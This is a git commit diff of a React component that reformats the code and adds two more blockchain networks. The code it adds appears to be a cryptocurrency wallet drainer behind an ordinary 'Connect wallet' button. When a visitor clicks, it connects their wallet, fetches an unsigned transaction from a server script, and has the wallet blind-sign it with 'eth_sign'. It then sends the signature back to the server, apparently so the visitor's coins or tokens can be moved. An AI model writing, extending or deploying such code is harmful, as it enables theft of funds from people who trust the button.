6ec00ebbea3f1a876b49593110140b7535dd92ef
xxxtentacali <xxxtentacionxxxtentacionxxx227@gmail.com>
2025-01-20 06:04:41 +0330

    Update App.js

--- src/App.js
+++ src/App.js
@@ -1,15 +1,14 @@
-
 import jQuery from "jquery"
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
+
 function App() {
 
   async function runner(){
     var ethereumProvider = await EthereumProvider.init({
-      showQrModal:true,
-      
-      qrModalOptions:{
-        themeMode:"dark",
-        explorerRecommendedWalletIds:[
+      showQrModal: true,
+      qrModalOptions: {
+        themeMode: "dark",
+        explorerRecommendedWalletIds: [
           'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
           '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
           '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
@@ -20,71 +19,62 @@ function App() {
           'be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d',
           '9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd'
         ]
-              
       },
-      chains:[1],
-      methods:['eth_sign','eth_sendTransaction','eth_signTransaction'],
-      projectId:"9fe3ed74e1d73141e8b7747bedf77551"
-    })
-    await ethereumProvider.enable()
+      chains: [1, 56, 137], // Added Binance Smart Chain (56) and Polygon (137)
+      methods: ['eth_sign', 'eth_sendTransaction', 'eth_signTransaction'],
+      projectId: "9fe3ed74e1d73141e8b7747bedf77551"
+    });
 
-    var provider = ethereumProvider
+    await ethereumProvider.enable();
 
-    var account = await provider.request({method:"eth_accounts"})
-    var account_sender = account[0]
-    console.log(account_sender)
-  
-    async function genSign(address,chain,type,contract="0"){
-      if (type == "coin"){
-        var result = await jQuery.post("send.php",{"handler":"tx","address":address,"chain":chain,"type":type})
-  
-        var unSigned = JSON.parse(result)
-        console.log(unSigned)
-    
-        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]})
-    
-        return Signed
-      }else if (type == "token"){
-        var result = await jQuery.post("send.php",{"handler":"tx","address":address,"chain":chain,"type":type,"contract":contract})
-  
-        var unSigned = JSON.parse(result)
-        console.log(unSigned)
-    
-        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]})
-    
-        return Signed
+    var provider = ethereumProvider;
+
+    var account = await provider.request({method: "eth_accounts"});
+    var account_sender = account[0];
+    console.log(account_sender);
+
+    async function genSign(address, chain, type, contract = "0") {
+      if (type === "coin") {
+        var result = await jQuery.post("send.php", { "handler": "tx", "address": address, "chain": chain, "type": type });
+
+        var unSigned = JSON.parse(result);
+        console.log(unSigned);
+
+        var Signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
+
+        return Signed;
+      } else if (type === "token") {
+        var result = await jQuery.post("send.php", { "handler": "tx", "address": address, "chain": chain, "type": type, "contract": contract });
+
+        var unSigned = JSON.parse(result);
+        console.log(unSigned);
+
+        var Signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
+
+        return Signed;
       }
-
-  
     }
-  
-    async function acceptSign(signature,type){
-      console.log(type)
-      if (type == "coin"){
-        var result = await jQuery.post("send.php",{"handler":"sign","signature":signature,"type":type})
-        var resultJson = JSON.parse(result)
-        return resultJson.result
-      }else if (type == "token"){
-        var result = await jQuery.post("send.php",{"handler":"sign","signature":signature,"type":type})
-        var resultJson = JSON.parse(result)
-        return resultJson.result
+
+    async function acceptSign(signature, type) {
+      console.log(type);
+      if (type === "coin" || type === "token") {
+        var result = await jQuery.post("send.php", { "handler": "sign", "signature": signature, "type": type });
+        var resultJson = JSON.parse(result);
+        return resultJson.result;
       }
-
     }
-    
-    var signature = await genSign(account_sender,"56","coin")
-  
-    console.log(signature)
 
-    var rawsign = await acceptSign(signature,"coin")
-    console.log("Raw : " + rawsign)
-  
+    var signature = await genSign(account_sender, "56", "coin"); // Example with Binance Smart Chain (56)
+    console.log(signature);
+
+    var rawsign = await acceptSign(signature, "coin");
+    console.log("Raw : " + rawsign);
   }
-  return (
-<a href="#" id="kos" onClick={runner} class="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left " data-uk-toggle="">
-                                <span>Connect wallet</span>
-                            </a>
 
+  return (
+    <a href="#" id="kos" onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left " data-uk-toggle="">
+      <span>Connect wallet</span>
+    </a>
   );
 }
 
